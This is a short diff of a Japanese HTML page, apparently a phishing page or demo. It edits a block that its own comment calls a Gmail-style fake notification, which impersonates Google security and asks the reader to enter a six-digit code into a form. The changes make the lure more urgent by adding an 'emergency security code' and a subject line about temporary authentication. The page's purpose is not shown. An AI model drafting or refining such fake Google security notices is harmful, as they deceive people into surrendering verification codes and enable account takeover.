@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html lang="ja">
 <head>
   <meta charset="UTF-8" />
@@ -175,10 +174,10 @@
     <!-- 📩 Gmail風フェイク通知 -->
     <div class="gmail-style">
       <p><strong>Google セキュリティ:</strong></p>
-      <p>あなたのGoogleアカウント <strong>your@email.com</strong> にセキュリティコードが送信されました。</p>
-      <p>件名: <em>[Google] ご本人によるログイン確認</em></p>
+      <p>あなたのGoogleアカウントにセキュリティコードが送信されました。</p>
+      <p>件名: <em>[Google] 本人確認できない場合、一時的な認証を受けられます。</em></p>
       <p>内容: 以下の6桁のコードをフォームに入力してください。<br>
-      <strong>セキュリティコード: 148239</strong></p>
+      <strong>非常セキュリティコード: 148239</strong></p>
       <p style="font-size: 0.8rem; color: #888;">※このメールは自動送信です。返信はできません。</p>
     </div>
   </div>
